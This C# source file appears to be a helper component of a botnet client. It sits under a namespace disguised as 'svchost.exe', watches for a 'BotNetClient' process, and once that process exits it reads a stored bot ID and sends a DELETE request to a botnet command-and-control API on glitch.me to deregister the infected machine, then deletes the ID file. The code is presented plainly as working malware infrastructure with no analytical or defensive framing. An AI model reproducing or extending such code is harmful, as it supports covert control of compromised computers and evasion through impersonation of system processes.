using System.Linq;
using System.Diagnostics;
using System.IO;
using System;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;
using System.Threading;

namespace svchost.exe
{
    class Program
    {
        static async Task Delete(uint id)
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("https://botnet-api.glitch.me/");
            await client.DeleteAsync($"/api/v1/ip/{id}");
        }
        static void Main(string[] args)
        {
            String pth = "System.Diagnostics.Process (BotNetClient)";
            Thread.Sleep(1000);
            string id;
            var processes = Process.GetProcesses();
            string[] proc = new string[processes.Length];
            for (int i = 0; i < processes.Length; i++)
            {
                proc[i] = processes[i].ToString();
            }
            while (true)
            {
                if (Array.IndexOf(proc,pth)>=0)
                {
                    Array.Clear(processes, 0, processes.Length);
                    processes = Process.GetProcesses();
                    Array.Clear(proc,0,proc.Length);
                    proc = new string[processes.Length];
                    for (int i = 0; i < processes.Length; i++)
                    {
                        proc[i] = processes[i].ToString();
                    }
                    continue;
                }
                else
                {
                    id = File.ReadAllText("C:\\ProgramData\\idbtc.txt");
                    Delete(Convert.ToUInt32(id)).Wait();
                    File.Delete("C:\\ProgramData\\idbtc.txt");
                    break;
                }
            }
        }
    }
}
